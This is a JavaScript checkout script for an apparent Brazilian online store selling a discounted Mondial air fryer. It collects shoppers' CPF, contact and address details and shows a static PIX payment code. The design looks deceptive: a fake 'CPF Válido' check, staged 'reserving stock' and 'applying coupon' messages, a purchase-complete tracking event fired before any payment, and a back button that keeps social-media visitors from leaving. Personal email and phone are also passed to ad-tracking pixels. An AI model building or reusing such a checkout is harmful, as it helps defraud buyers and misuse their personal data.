/**
 * checkout.app.js — Vanilla JS puro
 * Sem React, sem ReactDOM, sem Tailwind runtime.
 * O HTML do formulário já está no DOM ao carregar — este script só adiciona interatividade.
 */
(function () {
  'use strict';

  /* ═══════════════ CONSTANTES ═══════════════ */
  var PRODUCT = {
    name:          'Fritadeira Elétrica Forno Oven 12L Mondial AFON-12L-BI',
    price:         197.99,
    originalPrice: 399.90,
    id:            'AFON-12L-BI',
    image:         'assets/img/01.webp'
  };

  var DEFAULT_PIX_CODE = '00020101021226900014br.gov.bcb.pix2568pix.adyen.com/pixqrcodelocation/pixloc/v1/loc/hWu3o18RS3OOujzeqNF5iQ5204000053039865802BR5925MONETIZZE IMPULSIONADORA 6009SAO PAULO62070503***63047984';
  var DEFAULT_QR_URL   = '/assets/img/qrcode.webp';

  var pixCode    = DEFAULT_PIX_CODE;
  var qrCodeUrl  = DEFAULT_QR_URL;
  var isLocked   = false;
  var fetchingCep = false;

  /* ═══════════════ MÁSCARAS ═══════════════ */
  var phoneMask = window.createInputMask('phone');
  var cpfMask   = window.createInputMask('cpf');
  var cepMask   = window.createInputMask('cep');

  function applyMask(input, mask) {
    input.addEventListener('input', function (e) {
      if (isLocked) return;
      var sel = input.selectionStart;
      var res = mask.format(input.value, sel);
      input.value = res.formatted;
      try { input.setSelectionRange(res.cursorPosition, res.cursorPosition); } catch (_) {}
    });
  }

  /* ═══════════════ DOM REFS ═══════════════ */
  var form       = document.getElementById('checkout-form');
  var inpNome    = document.getElementById('inp-nome');
  var inpEmail   = document.getElementById('inp-email');
  var inpTel     = document.getElementById('inp-tel');
  var inpCpf     = document.getElementById('inp-cpf');
  var inpCep     = document.getElementById('inp-cep');
  var inpRua     = document.getElementById('inp-rua');
  var inpNum     = document.getElementById('inp-num');
  var inpCidade  = document.getElementById('inp-cidade');
  var progressBar = document.getElementById('progress-bar');
  var addressFields = document.getElementById('address-fields');
  var cepErrMsg  = document.getElementById('cep-error-msg');
  var cepSpinner = document.getElementById('cep-spinner');
  var cepIcon    = document.getElementById('cep-icon');
  var cpfProgress = document.getElementById('cpf-progress');
  var cpfBar     = document.getElementById('cpf-bar');
  var cpfLabel   = document.getElementById('cpf-label');
  var deliveryDate = document.getElementById('delivery-date');
  var btnBack    = document.getElementById('btn-back');
  var btnMobile  = document.getElementById('btn-submit-mobile');
  var btnDesktop = document.getElementById('btn-submit-desktop');
  var checkoutScreen = document.getElementById('checkout-screen');
  var footerBar  = document.getElementById('footer-bar');
  var pixScreen  = document.getElementById('pix-screen');

  /* ═══════════════ INICIALIZAÇÃO ═══════════════ */
  function init() {
    // Restaurar dados salvos
    try {
      var saved = JSON.parse(localStorage.getItem('checkout_safe_data') || '{}');
      if (saved.name)    inpNome.value    = saved.name;
      if (saved.email)   inpEmail.value   = saved.email;
      if (saved.phone)   inpTel.value     = saved.phone;
      if (saved.cpf)     inpCpf.value     = saved.cpf;
      if (saved.cep)     inpCep.value     = saved.cep;
      if (saved.address) inpRua.value     = saved.address;
      if (saved.number)  inpNum.value     = saved.number;
      if (saved.city)    inpCidade.value  = saved.city;
      if (saved.address || saved.cep) showAddressFields(false);
    } catch (_) {}

    // Data de entrega
    if (deliveryDate) deliveryDate.textContent = getDeliveryDate();

    // Máscaras
    applyMask(inpTel, phoneMask);
    applyMask(inpCpf, cpfMask);
    applyMask(inpCep, cepMask);

    // CEP listener
    inpCep.addEventListener('input', onCepInput);

    // CPF progress
    inpCpf.addEventListener('input', updateCpfProgress);
    updateCpfProgress();

    // Progress bar de preenchimento
    [inpNome, inpEmail, inpTel, inpCpf, inpRua, inpNum].forEach(function (inp) {
      inp.addEventListener('input', updateProgressBar);
    });
    updateProgressBar();

    // Salvar dados no blur
    [inpNome, inpEmail, inpTel, inpCpf, inpCep, inpRua, inpNum, inpCidade].forEach(function (inp) {
      inp.addEventListener('blur', saveData);
      inp.addEventListener('blur', function () { validateField(inp); });
    });

    // Progressive matching
    inpEmail.addEventListener('blur', function () { trackBlur('email', inpEmail.value); });
    inpTel.addEventListener('blur', function () { trackBlur('phone', inpTel.value); });

    // Botão voltar
    if (btnBack) btnBack.addEventListener('click', handleBack);

    // Desktop: mostrar botão
    if (btnDesktop) { btnDesktop.style.display = 'flex'; }

    // Keyboard detection
    if (window.setupKeyboardDetection) window.setupKeyboardDetection();

    // Buscar config PIX
    fetchPixConfig();

    // Analytics
    setTimeout(function () { if (window.loadAnalytics) window.loadAnalytics(); }, 3500);
    try {
      window.scrollTo(0, 0);
      if (window.trackPixel) {
        window.trackPixel('ViewContent', Object.assign({}, window.PRODUCT_CONTENT, { event_id: window.generateEventId(), content_name: PRODUCT.name }));
        window.trackPixel('InitiateCheckout', Object.assign({}, window.PRODUCT_CONTENT, { content_name: PRODUCT.name, event_id: window.generateEventId() }));
      }
    } catch (_) {}

    // Notificar analytics que checkout carregou (sem skeleton)
    try {
      window.__ckReadyAt = Date.now();
      if (window.__ckTrack && window.__ckTrack.checkoutReady) window.__ckTrack.checkoutReady();
    } catch (_) {}
  }

  /* ═══════════════ PERSISTÊNCIA ═══════════════ */
  function saveData() {
    try {
      localStorage.setItem('checkout_safe_data', JSON.stringify({
        name: inpNome.value, email: inpEmail.value, phone: inpTel.value,
        cpf: inpCpf.value, cep: inpCep.value, address: inpRua.value,
        number: inpNum.value, city: inpCidade.value
      }));
    } catch (_) {}
  }

  /* ═══════════════ PROGRESS BAR ═══════════════ */
  function updateProgressBar() {
    var fields = [inpNome.value, inpEmail.value, inpTel.value, inpCpf.value, inpRua.value, inpNum.value];
    var filled = fields.filter(function (v) { return v && v.trim(); }).length;
    var pct = Math.min(Math.round((filled / 6) * 100), 100);
    if (progressBar) progressBar.style.width = pct + '%';
  }

  /* ═══════════════ CPF PROGRESS ═══════════════ */
  function updateCpfProgress() {
    var len = inpCpf.value.replace(/\D/g, '').length;
    if (len === 0) { cpfProgress.classList.remove('visible'); return; }
    cpfProgress.classList.add('visible');
    var pct = Math.min(Math.round((len / 11) * 100), 100);
    var done = len >= 11;
    cpfBar.style.width = pct + '%';
    cpfBar.style.background = done ? '#16a34a' : '#d1d5db';
    cpfLabel.textContent = done ? 'CPF Válido' : 'Digitando...';
    cpfLabel.style.color = done ? '#16a34a' : '#9ca3af';
  }

  /* ═══════════════ CEP ═══════════════ */
  function onCepInput() {
    if (isLocked) return;
    var raw = inpCep.value.replace(/\D/g, '');
    if (raw.length < 8) {
      cepErrMsg.style.display = 'none';
      return;
    }
    if (raw.length === 8) fetchCep(raw);
  }

  function fetchCep(cep) {
    if (fetchingCep) return;
    fetchingCep = true;
    cepIcon.style.display = 'none';
    cepSpinner.style.display = 'block';

    var controller = window.AbortController ? new AbortController() : null;
    var timeoutId = setTimeout(function () { if (controller) controller.abort(); }, 5000);

    fetch('https://viacep.com.br/ws/' + cep + '/json/', controller ? { signal: controller.signal } : {})
      .then(function (res) {
        clearTimeout(timeoutId);
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return res.json();
      })
      .then(function (data) {
        if (data && !data.erro) {
          if (data.logradouro) inpRua.value = data.logradouro;
          var city = (data.localidade || '') + (data.uf ? '/' + data.uf : '');
          if (city) inpCidade.value = city;
          cepErrMsg.style.display = 'none';
          showAddressFields(true);
          setTimeout(function () { try { inpNum.focus(); } catch (_) {} }, 300);
        } else {
          cepErrMsg.style.display = 'block';
          showAddressFields(true);
        }
      })
      .catch(function () {
        clearTimeout(timeoutId);
        cepErrMsg.style.display = 'block';
        showAddressFields(true);
      })
      .finally(function () {
        fetchingCep = false;
        cepIcon.style.display = 'block';
        cepSpinner.style.display = 'none';
        saveData();
      });
  }

  function showAddressFields(animate) {
    if (!addressFields) return;
    addressFields.classList.add('visible');
    updateProgressBar();
  }

  /* ═══════════════ VALIDAÇÃO ═══════════════ */
  function showError(id, show) {
    var el = document.getElementById(id);
    if (!el) return;
    if (show) el.classList.add('visible'); else el.classList.remove('visible');
  }

  function setInputState(inp, state) { // 'valid' | 'error' | ''
    inp.classList.remove('valid', 'error');
    if (state) inp.classList.add(state);
  }

  function validateField(inp) {
    if (!inp || !inp.id) return true;
    var v = inp.value || '';
    var ok = true;
    if (inp.id === 'inp-nome') {
      ok = v.trim().length > 1;
      setInputState(inp, ok ? 'valid' : 'error');
      showError('err-nome', !ok);
    } else if (inp.id === 'inp-email') {
      ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
      setInputState(inp, ok ? 'valid' : (v ? 'error' : ''));
      showError('err-email', !ok && !!v);
    } else if (inp.id === 'inp-tel') {
      ok = v.replace(/\D/g, '').length >= 10;
      setInputState(inp, ok ? 'valid' : (v ? 'error' : ''));
      showError('err-tel', !ok && !!v);
    }
    return ok;
  }

  function validateAll() {
    var nameOk  = inpNome.value.trim().length > 1;
    var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inpEmail.value.trim());
    var telOk   = inpTel.value.replace(/\D/g, '').length >= 10;

    setInputState(inpNome,  nameOk  ? 'valid' : 'error'); showError('err-nome',  !nameOk);
    setInputState(inpEmail, emailOk ? 'valid' : 'error'); showError('err-email', !emailOk);
    setInputState(inpTel,   telOk   ? 'valid' : 'error'); showError('err-tel',   !telOk);

    return nameOk && emailOk && telOk;
  }

  /* ═══════════════ SUBMIT ═══════════════ */
  window.handleSubmit = function (ev) {
    if (ev) ev.preventDefault();
    if (isLocked) return;
    isLocked = true;
    setButtonState('loading');

    if (!validateAll()) {
      // Scroll para primeiro erro
      var firstError = form.querySelector('.error');
      if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
      isLocked = false;
      setButtonState('idle');
      return;
    }

    if (document.activeElement && document.activeElement.blur) document.activeElement.blur();

    var name      = inpNome.value.trim();
    var email     = inpEmail.value.trim().toLowerCase();
    var phone     = inpTel.value.replace(/\D/g, '');
    var nameParts = name.split(' ');
    var firstName = nameParts[0];
    var orderId   = 'ord_' + Date.now();

    window.__ckSubmitAt = Date.now();
    try { if (window.__ckTrack) window.__ckTrack.submitClick && window.__ckTrack.submitClick(); } catch (_) {}

    if (window.trackPixel) {
      window.trackPixel('AddPaymentInfo', Object.assign({}, window.PRODUCT_CONTENT, {
        event_id: window.generateEventId(), order_id: orderId, email: email, phone: phone
      }));
    }

    // Salvar pedido (fire-and-forget)
    try {
      var payload = JSON.stringify({
        name: name, phone: phone,
        ref: (function () { try { return (localStorage.getItem('ttclid') || '').slice(-8); } catch (_) { return ''; } })(),
        source: 'checkout_public', status: 'pending'
      });
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/api/order-create', new Blob([payload], { type: 'application/json' }));
      } else {
        fetch('/api/order-create', { method: 'POST', headers: { 'content-type': 'application/json' }, body: payload, keepalive: true }).catch(function () {});
      }
    } catch (_) {}

    saveData();

    // Mostrar PIX após 800ms
    setTimeout(function () { showPixScreen(firstName, orderId, email, phone); }, 800);
  };

  if (form) form.addEventListener('submit', window.handleSubmit);

  function setButtonState(state) {
    var loading = state === 'loading';
    var loadHTML = '<span style="display:flex;align-items:center;gap:8px"><div class="spinner"></div>Processando...</span>';
    var idleHTML = '<span style="display:flex;align-items:center;gap:8px">FINALIZAR COM DESCONTO<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"><polyline points="9 18 15 12 9 6"/></svg></span>';
    if (btnMobile) {
      btnMobile.disabled = loading;
      btnMobile.style.opacity = loading ? '.8' : '1';
      document.getElementById('btn-mobile-text').innerHTML = loading ? loadHTML : idleHTML;
    }
    if (btnDesktop) {
      btnDesktop.disabled = loading;
      btnDesktop.style.opacity = loading ? '.8' : '1';
      document.getElementById('btn-submit-desktop-text').innerHTML = loading ? loadHTML : idleHTML;
    }
  }

  /* ═══════════════ PIX SCREEN ═══════════════ */
  function showPixScreen(firstName, orderId, email, phone) {
    // Esconder checkout
    checkoutScreen.style.display = 'none';
    if (footerBar) footerBar.style.display = 'none';

    // Mostrar PIX
    pixScreen.style.display = 'block';
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Preencher dados
    var greeting = document.getElementById('pix-greeting');
    if (greeting) greeting.textContent = 'Quase lá, ' + firstName + '!';
    var codeEl = document.getElementById('pix-code-text');
    if (codeEl) codeEl.textContent = pixCode;
    var tidEl = document.getElementById('pix-tid');
    if (tidEl) tidEl.textContent = 'ID: ' + orderId;

    // Analytics
    window.__ckPixShownAt = Date.now();
    try { if (window.__ckTrack && window.__ckTrack.pixShown) window.__ckTrack.pixShown(); } catch (_) {}
    if (window.trackPixel) {
      window.trackPixel('CompletePayment', Object.assign({}, window.PRODUCT_CONTENT, {
        content_name: PRODUCT.name, value: PRODUCT.price, currency: 'BRL',
        order_id: orderId, event_id: window.generateEventId(), email: email, phone: phone
      }));
    }

    // Animação de loading
    var loadingEl  = document.getElementById('pix-loading');
    var contentEl  = document.getElementById('pix-content');
    var loadingTxt = document.getElementById('pix-loading-text');
    var msgs = ['Iniciando transação segura...', 'Reservando estoque...', 'Aplicando cupom de oferta...'];
    var step = 0;
    var t1 = setTimeout(function () { loadingTxt.textContent = msgs[1]; step = 1; }, 500);
    var t2 = setTimeout(function () { loadingTxt.textContent = msgs[2]; step = 2; }, 1200);
    var t3 = setTimeout(function () {
      loadingEl.style.display = 'none';
      contentEl.style.display = 'block';
      requestAnimationFrame(function () { contentEl.classList.add('visible'); });
    }, 2000);
  }

  /* ═══════════════ COPIAR PIX ═══════════════ */
  window.copyPix = function () {
    var btnCopy  = document.getElementById('btn-copy-pix');
    var btnText  = document.getElementById('copy-btn-text');
    var copyIcon = document.getElementById('copy-icon');
    var orderId  = (document.getElementById('pix-tid') || {}).textContent || '';
    orderId = orderId.replace('ID: ', '');

    // Analytics
    if (window.trackPixel) {
      window.trackPixel('Pix_Copy_Click', { event_id: window.generateEventId(), order_id: orderId });
    }
    window.__ckPixCopiedAt = Date.now();
    try { if (window.__ckTrack && window.__ckTrack.pixCopied) window.__ckTrack.pixCopied(); } catch (_) {}

    // Contador backend
    try {
      var p = JSON.stringify({ ts: Date.now(), order_id: orderId });
      if (navigator.sendBeacon) navigator.sendBeacon('/api/metrics/pix-copy', p);
      else fetch('/api/metrics/pix-copy', { method: 'POST', headers: { 'content-type': 'application/json' }, body: p, keepalive: true }).catch(function () {});
    } catch (_) {}

    // Copiar
    var doCopy = window.safeCopyToClipboard
      ? window.safeCopyToClipboard(pixCode)
      : Promise.reject();

    doCopy.catch(function () {
      if (window.fallbackCopy) window.fallbackCopy(pixCode);
      else try { window.prompt('Copie o código PIX:', pixCode); } catch (_) {}
    }).finally(function () {
      // Feedback visual
      if (btnCopy) btnCopy.style.background = '#1e293b';
      if (copyIcon) copyIcon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
      if (btnText) btnText.textContent = 'CÓDIGO COPIADO!';
      setTimeout(function () {
        if (btnCopy) btnCopy.style.background = '#22c55e';
        if (copyIcon) copyIcon.innerHTML = '<rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>';
        if (btnText) btnText.textContent = 'CLIQUE PARA COPIAR';
      }, 2000);
    });
  };

  /* ═══════════════ VOLTAR ═══════════════ */
  function handleBack() {
    if (isLocked) return;
    try {
      var ref = document.referrer || '';
      if (window.history.length > 1 && ref && ref.indexOf(window.location.origin) === 0
          && !/tiktok|instagram|facebook|t\.co/i.test(ref)) {
        window.history.back();
      } else {
        window.location.href = '/';
      }
    } catch (_) { window.location.href = '/'; }
  }

  /* ═══════════════ DATA DE ENTREGA ═══════════════ */
  function getDeliveryDate() {
    var d = new Date();
    d.setDate(d.getDate() + 4);
    var days   = ['Domingo','Segunda-feira','Terça-feira','Quarta-feira','Quinta-feira','Sexta-feira','Sábado'];
    var months = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
    return days[d.getDay()] + ', ' + d.getDate() + ' de ' + months[d.getMonth()];
  }

  /* ═══════════════ TRACKING BLUR ═══════════════ */
  var trackedBlurs = {};
  function trackBlur(field, value) {
    if (!value || trackedBlurs[field]) return;
    var ok = false;
    if (field === 'email') ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
    if (field === 'phone') ok = value.replace(/\D/g, '').length >= 10;
    if (ok) {
      trackedBlurs[field] = true;
      if (window.trackPixel) window.trackPixel('InputCaptured', { field_name: field, event_id: window.generateEventId(), [field]: value });
    }
  }

  /* ═══════════════ CONFIG PIX ═══════════════ */
  function fetchPixConfig() {
    fetch('/api/pix-config?_=' + Date.now(), { cache: 'no-store' })
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (cfg) {
        if (!cfg || typeof cfg !== 'object') return;
        if (typeof cfg.pix_code === 'string' && cfg.pix_code.trim()) pixCode = cfg.pix_code.trim();
        if (typeof cfg.qrcode_url === 'string') qrCodeUrl = cfg.qrcode_url;
      })
      .catch(function () {});
  }

  /* ═══════════════ START ═══════════════ */
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
